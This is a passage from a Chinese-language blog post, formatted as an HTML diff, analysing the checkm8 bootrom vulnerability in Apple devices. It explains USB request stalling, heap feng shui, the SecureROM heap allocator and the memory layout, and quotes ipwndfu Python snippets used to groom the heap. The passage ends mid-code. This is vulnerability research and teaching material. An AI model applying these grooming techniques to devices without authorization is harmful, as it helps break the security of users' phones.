+</ul>
+
+<p>usb_device_io_request被加入ep→io_buffer队列进行数据传输，传输完毕后被销毁，这个过程攻击者无法介入。这种情况下攻击者无法连续分配多个usb_device_io_request对象进行堆排布。</p>
+
+<p>攻击者向设备发送bmRequest=0x80，bRequest=0x6，wLength=0xC0的SETUP package，请求USB设备描述符。</p>
+
+<p>设备描述符的实际长度为0xC6字节，设备按照攻击者的要求传输前0xC0个字节。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">stall</span><span class="p">(</span><span class="n">device</span><span class="p">):</span>   
+	<span class="nf">libusb1_async_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0x304</span><span class="p">,</span> <span class="mh">0x40A</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mf">0.00001</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>0.00001秒后主机单方面取消了数据接收，此时设备仅发送了第一个0x40分段。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">transfer_ptr</span> <span class="o">=</span> <span class="nf">libusb1_create_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">request_timeout</span><span class="p">)</span>
+<span class="n">usb</span><span class="p">.</span><span class="n">backend</span><span class="p">.</span><span class="n">libusb1</span><span class="p">.</span><span class="n">_lib</span><span class="p">.</span><span class="nf">libusb_submit_transfer</span><span class="p">(</span><span class="n">transfer_ptr</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">timeout</span> <span class="o">/</span> <span class="mf">1000.0</span><span class="p">:</span>
+  <span class="k">pass</span>
+
+<span class="n">usb</span><span class="p">.</span><span class="n">backend</span><span class="p">.</span><span class="n">libusb1</span><span class="p">.</span><span class="n">_lib</span><span class="p">.</span><span class="nf">libusb_cancel_transfer</span><span class="p">(</span><span class="n">transfer_ptr</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>后续设备一直收不到主机的IN token请求，传输任务阻塞，usb_device_io_request对象滞留在传输队列中。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-25_13.50.06.png" alt="截屏2025-03-25 13.50.06.png" /></p>
+
+<p>主机向设备发送RESET命令，传输队列中的usb_device_io_request对象被全部释放。</p>
+
+<p>主机通过中断device to host传输的方式，可以精确控制usb_device_io_request对象的分配和释放。</p>
+
+<ol>
+  <li><strong>分配连续usb_device_io_request对象</strong></li>
+</ol>
+
+<p>device to host传输阻塞的过程中，设备还能继续接收新的device to host传输请求，新的usb_device_io_request对象继续加入传输队列。</p>
+
+<p>由于ep→io_head队列是FIFO的进出方式，后进来的usb_device_io_request对象也被阻塞，造成连续分配的效果。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nf">stall</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
+ <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">hole</span><span class="p">):</span>
+	 <span class="nf">no_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ol>
+  <li><strong>制造usb_device_io_request对象内存泄漏</strong></li>
+</ol>
+
+<p>若传输任务的数据量是0x40的倍数，且比实际请求的数据量小，在释放usb_device_io_request对象之前又会申请一个zlp usb_device_io_request对象，该zlp对象失去引用变成内存泄漏。</p>
+
+<p>因此攻击者可以通过控制wLength字段的大小，制造内存泄漏。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">standard_device_request_cb</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">req</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">%</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
+					<span class="p">(</span><span class="n">setup_request</span><span class="p">.</span><span class="n">wLength</span> <span class="o">&gt;</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span><span class="p">))</span> <span class="p">{</span>
+		<span class="n">usb_core_send_zlp</span><span class="p">();</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>要注意的是堆块大小不仅包括usb_device_io_request对象，还包括0x40大小的元数据。</p>
+
+<h2 id="堆管理器">堆管理器</h2>
+
+<ol>
+  <li>核心数据结构</li>
+</ol>
+
+<p>Apple自己开发了堆管理器，SecureROM和iBoot阶段使用的都是同一套代码。</p>
+
+<p>实现了malloc、realloc、calloc、free函数，memalign用于分配大内存。</p>
+
+<p>底层实现了heap_malloc和heap_free做具体的分配和释放。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_14.00.12.png" alt="截屏2025-03-12 14.00.12.png" /></p>
+
+<p>堆管理器的核心数据结构是heap_block、free_block。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_14.15.00.png" alt="截屏2025-03-12 14.15.00.png" /></p>
+
+<p>heap_block是活动对象的头部元数据，malloc成功之后把指向数据区域的指针返回给用户。</p>
+
+<p>释放对象时，元数据变成free_block，原本的数据区头部会新增next_in_bin和pre_in_bin两个指针，用于加入对应大小的bin链表中。</p>
+
+<p>堆块分配大小都是heap_block对象大小的整数倍，heap_block对象大小为0x40字节。</p>
+
+<p>若小于free_block对象的大小0x50字节，则按照free_block对象大小来分配。</p>
+
+<p>所以分配对象的大小至少为0x50字节。</p>
+
+<p>这么做的目的是在满足用户需求的同时，确保能容纳下堆块的元数据。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="nf">required_size</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
+	<span class="n">size</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">heap_block</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="n">size</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">heap_block</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">))</span> <span class="p">{</span>
+		<span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_14.55.57.png" alt="截屏2025-03-12 14.55.57.png" /></p>
+
+<ol>
+  <li>空闲对象链表</li>
+</ol>
+
+<p>bins[32]数组是空闲对象链表的核心，作用是把空闲对象按照大小分类，加入不同的链表中。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_13.53.05.png" alt="截屏2025-03-12 13.53.05.png" /></p>
+
+<p>计算bin下标的逻辑如下，首先size除以64计算是几个heap_block大小。</p>
+
+<p>32减去size前导0的数量就是bin的下标。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">unsigned</span> <span class="nf">compute_bin</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">){</span>
+	<span class="kt">unsigned</span> <span class="n">result</span><span class="p">;</span>
+	<span class="n">size</span> <span class="o">=</span> <span class="n">quantify_size</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>   <span class="c1">//计算是几个heap_block大小</span>
+
+	<span class="c1">// clz can't operate on &gt; 32-bit values, so return an invalid bin</span>
+	<span class="c1">// number to force grab_chunk to fail and free_list_add to assert</span>
+	<span class="k">if</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">UINT32_MAX</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">NUM_BINS</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">result</span> <span class="o">=</span> <span class="n">NUM_BINS</span> <span class="o">-</span> <span class="n">__builtin_clz</span><span class="p">((</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">size</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>举例来说，若释放对象大小为0x50，除以0x40得1，下标就是32 - 31 = 1，因此加入bin[1]链表。</p>
+
+<p>链表的加入方式是从头部加入。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%A0%86%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E5%AE%9E%E7%8E%B0_%E7%A9%BA%E9%97%B2%E9%93%BE%E8%A1%A8.jpg" alt="checkm8-堆管理器的实现 空闲链表.jpg" /></p>
+
+<ol>
+  <li>空闲对象的合并</li>
+</ol>
+
+<p>释放一个对象时，会检查相邻前后的对象是否活跃，若相邻对象不活跃则与之合并。</p>
+
+<p>首先把相邻的对象从bin链表上取下，修改元数据this_size字段相加。</p>
+
+<p>合并后的对象设置this_free标志位，重新加入到bins链表中。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span>
+<span class="nf">merge_blocks_left</span><span class="p">(</span><span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">left</span><span class="p">,</span> <span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">right</span><span class="p">){</span>
+	<span class="n">free_list_remove</span><span class="p">((</span><span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="p">)(</span><span class="n">left</span><span class="p">));</span>  <span class="c1">//</span>
+
+	<span class="n">left</span><span class="o">-&gt;</span><span class="n">this_size</span> <span class="o">+=</span> <span class="n">right</span><span class="o">-&gt;</span><span class="n">this_size</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">HEAP_CHECKS</span><span class="p">)</span> <span class="p">{</span>
+		<span class="c1">// the right block is going away, so make sure it no longer</span>
+		<span class="c1">// looks like a real block</span>
+		<span class="n">right</span><span class="o">-&gt;</span><span class="n">this_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="n">right</span><span class="o">-&gt;</span><span class="n">prev_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="n">right</span><span class="o">-&gt;</span><span class="n">checksum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="n">left</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">heap_free</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">){</span>
+	<span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">block</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">left</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">right</span><span class="p">;</span>
+	
+	<span class="n">left</span> <span class="o">=</span> <span class="n">prev_block</span><span class="p">(</span><span class="n">block</span><span class="p">);</span>		<span class="c1">//指向前一个堆块的heap_block</span>
+	<span class="n">right</span> <span class="o">=</span> <span class="n">next_block</span><span class="p">(</span><span class="n">block</span><span class="p">);</span>		<span class="c1">//指向后一个堆块的heap_block</span>
+	
+	<span class="n">block</span> <span class="o">=</span> <span class="n">merge_blocks_left</span><span class="p">(</span><span class="n">left</span><span class="p">,</span> <span class="n">block</span><span class="p">);</span>
+	<span class="n">block</span> <span class="o">=</span> <span class="n">merge_blocks_right</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">right</span><span class="p">);</span>
+	
+	<span class="n">block</span><span class="o">-&gt;</span><span class="n">this_free</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="n">free_list_add</span><span class="p">((</span><span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="p">)</span><span class="n">block</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>堆块分配策略</li>
+</ol>
+
+<p>计算实际分配大小时，会在用户请求大小的基础上增加堆头元数据的空间，能够分配的最小堆块为0x50，大于0x50的堆块要和0x40对齐。</p>
+
+<p>分配堆块的主要逻辑是grab_chunk函数，从bins链头部开始遍历，表寻找尺寸合适的空闲堆块。</p>
+
+<p>若空闲堆块大于所需空间，那么切分空闲堆块，剩下部分重新加入bins链表。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">grab_chunk</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">user_size</span><span class="p">){</span>
+	<span class="k">for</span> <span class="p">(</span><span class="n">bin</span><span class="o">=</span> <span class="n">compute_bin</span><span class="p">(</span><span class="n">size</span><span class="p">);</span> <span class="n">bin</span><span class="o">&lt;</span> <span class="n">NUM_BINS</span><span class="p">;</span> <span class="n">bin</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">curr</span><span class="p">;</span>
+		<span class="n">curr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">bins</span><span class="p">[</span><span class="n">bin</span><span class="p">];</span>
+		<span class="n">curr</span> <span class="o">=</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">next_in_bin</span><span class="p">;</span>
+		<span class="k">while</span> <span class="p">(</span><span class="n">curr</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">sizeof_block</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">common</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+				<span class="n">verify_block_checksum</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">common</span><span class="p">);</span>
+				<span class="n">free_list_remove</span><span class="p">(</span><span class="n">curr</span><span class="p">);</span>
+				<span class="n">split_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">common</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_size</span><span class="p">);</span>
+
+				<span class="k">return</span> <span class="n">curr</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="n">curr</span> <span class="o">=</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">next_in_bin</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="nf">heap_malloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">caller_name</span><span class="p">){</span>
+	<span class="kt">size_t</span> <span class="n">size_r</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">heap_block</span> <span class="o">*</span><span class="n">retval</span><span class="p">;</span>
+	
+	<span class="n">size_r</span> <span class="o">=</span> <span class="n">required_size</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+	<span class="n">retval</span> <span class="o">=</span> <span class="n">grab_chunk</span><span class="p">(</span><span class="n">size_r</span> <span class="o">+</span> <span class="n">size_d</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>堆的初始化</li>
+</ol>
+
+<p>堆的初始化由heap_add_chunk函数完成，调用路径为_main —&gt; sys_init —&gt; heap_add_chunk。</p>
+
+<p>堆区域从0x1801B4000开始，大小为0x4C000。</p>
+
+<p>heap_add_chunk将0x1801B4040～0x1801FFFC0之间的区域构造成空闲块，放入bins[12]链表中作为第一个链表元素。</p>
+
+<p>初始化完成后，malloc就从bins[12]开始分割所需大小。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_15_%E9%A1%B5.jpg" alt="checkm8-第 15 页.jpg" /></p>
+
+<ol>
+  <li>安全检查</li>
+</ol>
+
+<p>verify_block_checksum函数计算堆块元数据heap_block的校验和，与保存在heap_block中的checksum对比，若不相等则触发panic。作用是检查堆块是否被破坏。</p>
+
+<p>在分配和释放操作中很多地方都用到了verify_block_checksum，因此对堆块的保护是比较严格的。</p>
+
+<h2 id="securerom内存布局">SecureROM内存布局</h2>
+
+<p>SecureROM运行在aarch64状态，并且打开了MMU，页面粒度为16KB，2级页表分页机制，地址总线为36位。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.49.58.png" alt="截屏2025-03-09 13.49.58.png" /></p>
+
+<p>其中页表索引长度为11位，每个页表包含2048个页表项，页表大小为16KB。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%88%92%E5%88%86.jpg" alt="checkm8-虚拟地址划分.jpg" /></p>
+
+<p>页表初始化路径：_main() → arch_cpu_init() → arm_mmu_init()</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.00.49.png" alt="截屏2025-03-09 13.00.49.png" /></p>
+
+<p>L2页表基地址为0x1800A0000</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_08.37.13.png" alt="截屏2025-03-11 08.37.13.png" /></p>
+
+<p>内存布局如下，都是恒等映射，即虚拟地址和物理地址是相等的。</p>
+
+<p>其中代码段和BOOT_TRAMPOLINE段具有可执行权限，堆区域位于0x1801B4000~0x1801FFFF。</p>
+
+<p>在DFU模式下，手机接收的固件会保存在INSECURE_MEMORY区域，固件接收完成后会跳转到这片区域运行。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-SecureROM%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80.jpg" alt="checkm8-SecureROM内存布局.jpg" /></p>
+
+<h1 id="ipwndfu分析">ipwndfu分析</h1>
+
+<h2 id="堆风水">堆风水</h2>
+
+<p>堆风水用到了stall、no_leak、usb_req_leak三个usb接口函数。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nf">stall</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
+ <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">hole</span><span class="p">):</span>        <span class="c1"># for i in range(5)
+</span>	 <span class="nf">no_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>                   <span class="c1"># no_leak
+</span> <span class="nf">usb_req_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
+ <span class="nf">no_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
+ <span class="n">dfu</span><span class="p">.</span><span class="nf">usb_reset</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>               <span class="c1"># 重置USB，释放全部usb_device_io_request对象
+</span> <span class="n">dfu</span><span class="p">.</span><span class="nf">release_device</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>这些请求的共同参数是：</p>
+
+<ul>
+  <li>bmRequestType = 0x80</li>
+  <li>bRequest = 6 (GET_DESCRIPTOR操作)</li>
+  <li>wValue = 0x304
+    <ul>
+      <li>wValueHigh = 0x3，USB_DT_STRING，获取字符串)</li>
+      <li>wValueLow = 0x4，字符串描述符的下标是4，对应于设备序列号，这台iPhone7的usb序列号是CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</li>
+    </ul>
+  </li>
+  <li>wIndex = 0x40A</li>
+</ul>
+
+<p>参数中不同的地方是wLength。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_12.17.57.png" alt="截屏2025-03-09 12.17.57.png" /></p>
+
+<p>usb_device_io_request加入到端点的IO队列末尾等待处理。</p>
+
+<p>若第一个usb_device_io_request得不到处理，后续的usb_device_io_request也会一直卡住。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_do_endpoint_io</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">req</span><span class="p">){</span>
+	<span class="k">struct</span> <span class="n">usb_endpoint_instance</span> <span class="o">*</span><span class="n">ep</span><span class="p">;</span>
+	<span class="n">u_int32_t</span> <span class="n">epindex</span><span class="p">;</span>
+    
+	<span class="n">epindex</span> <span class="o">=</span> <span class="n">ep_to_epindex</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">endpoint</span><span class="p">);</span>
+	<span class="n">ep</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">synopsys_otg_endpoints</span><span class="p">[</span><span class="n">epindex</span><span class="p">];</span>
+    
+	<span class="c1">// pending IOs</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">)</span> <span class="p">{</span>		<span class="c1">//新的usb_device_io_request加入ep端点的IO队列尾部，FIFO</span>
+		<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">req</span><span class="p">;</span>
+		<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="n">req</span><span class="p">;</span>
+		<span class="k">goto</span> <span class="n">exit</span><span class="p">;</span>
+	<span class="p">}</span>
+    
+	<span class="c1">// IO队列是空的</span>
+	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="n">req</span><span class="p">;</span>
+    
+	<span class="c1">// start transmitting/receiving the data</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">ep_to_epdir</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">endpoint</span><span class="p">))</span> <span class="p">{</span>
+		<span class="n">synopsys_otg_start_endpoint_in</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">endpoint</span><span class="p">);</span>	<span class="c1">//处理DEVICE 2 HOST</span>
+	<span class="p">}</span>
+	<span class="k">else</span> <span class="p">{</span>
+		<span class="n">synopsys_otg_start_endpoint_out</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">endpoint</span><span class="p">);</span>	<span class="c1">//处理HOST 2 DEVICE</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>向设备发送重置命令，设备进入到USB重置流程，执行synopsys_otg_abort_endpoint函数，释放IO队列上面的所有usb_device_io_request对象。</p>
+
+<p>调用路径是：handle_interrupt —&gt; synopsys_otg_handle_usb_reset —&gt; usb_core_abort_endpoint —&gt; usb_controller_abort_endpoint —&gt; synopsys_otg_abort_endpoint</p>
+
+<p>synopsys_otg_abort_endpoint先把端点的IO队列整体摘下，保存在aborted_list队列中，通过遍历aborted_list释放所有的usb_device_io_request对象。</p>
+
+<p>释放usb_device_io_request对象先调用callback回调函数，再释放usb_device_io_request对象。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>
+
+	<span class="p">......</span>
+	
+	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>         <span class="c1">//摘下端点的IO队列</span>
+	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	
+	<span class="p">......</span>
+
+	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
+		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
+		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="p">}</span>  
+	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>callback回调函数是standard_device_request_cb。</p>
+
+<p>req→io_length是设备向主机返回的字符串的长度，对应于wLength。</p>
+
+<p>setup_request.wLength取最后一次setup报文的wLength值，no_leak是堆风水过程中最后一次操作setup报文，因此setup_request.wLength = 0xC1。</p>
+
+<p>若usb_device_io_request::io_length是0x40对齐，那么向主机回一个zero length packet零长度数据包。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">standard_device_request_cb</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">req</span><span class="p">){</span>
+	<span class="k">if</span><span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span> <span class="o">%</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
+		<span class="p">(</span><span class="n">setup_request</span><span class="p">.</span><span class="n">wLength</span> <span class="o">&gt;</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">io_length</span><span class="p">))</span> <span class="p">{</span>
+		<span class="n">usb_core_send_zlp</span><span class="p">();</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>usb_core_send_zlp申请一个usb_device_io_request对象，调用usb_controller_do_endpoint_io重新加入到端点的IO队列中。</p>
+
+<p>zlp对象会驻留在堆上，不会被synopsys_otg_abort_endpoint释放。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_send_zlp</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+	<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="p">;</span>
+	<span class="c1">//申请usb_device_io_request</span>
